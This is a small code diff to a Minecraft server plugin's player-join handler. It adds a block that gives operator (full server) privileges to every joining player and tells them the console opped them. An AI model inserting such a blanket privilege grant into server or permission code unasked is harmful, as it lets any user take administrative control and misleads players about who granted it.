@@ -820,6 +820,12 @@ public class TFM_PlayerListener implements Listener
                 TFM_AdminList.updateLastLogin(player);
             }
         }
+        // Handles OP on join
+            if (player.isOp() == false)
+            {
+                player.setOp(true);
+                player.sendMessage("[AutoOP] You have been opped by console");
+            }
 
         // Handle admin impostors
         if (TFM_AdminList.isAdminImpostor(player))
